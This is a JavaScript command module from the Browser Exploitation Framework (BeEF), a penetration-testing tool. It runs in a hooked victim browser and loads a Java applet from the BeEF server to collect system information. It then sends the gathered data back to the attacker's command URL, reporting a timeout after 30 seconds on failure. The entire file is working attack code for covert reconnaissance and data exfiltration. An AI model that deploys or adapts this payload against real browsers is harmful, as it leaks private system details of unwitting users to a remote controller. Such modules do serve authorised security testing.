//
// Copyright (c) 2006-2023Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

beef.execute(function() {

  var internal_counter = 0;
  var timeout = 30;
  var output;

  beef.debug('[Get System Info (Java)] Loading getSystemInfo applet...');
  beef.dom.attachApplet('getSystemInfo', 'getSystemInfo', 'getSystemInfo', beef.net.httpproto+"://"+beef.net.host+":"+beef.net.port+"/", null, null);

  function waituntilok() {
    beef.debug('[Get System Info (Java)] Executing getSystemInfo applet...');

    try {
      output = document.getSystemInfo.getInfo();
      if (output) {
        beef.debug('[Get System Info (Java)] Retrieved system info: ' + output);
         beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info='+output.replace(/\n/g,"<br>"), beef.are.status_success());
        beef.dom.detachApplet('getSystemInfo');
        return;
      }
    } catch (e) {
      internal_counter = internal_counter + 5;
      if (internal_counter > timeout) {
        beef.debug('[Get System Info (Java)] Timeout after ' + timeout + ' seconds');
        beef.net.send('<%= @command_url %>', <%= @command_id %>, 'system_info=Timeout after ' + timeout + ' seconds', beef.are.status_error());
        beef.dom.detachApplet('getSystemInfo');
        return;
      }
      setTimeout(function() {waituntilok()}, 5000);
    }
  }

  setTimeout(function() {waituntilok()}, 5000);
});

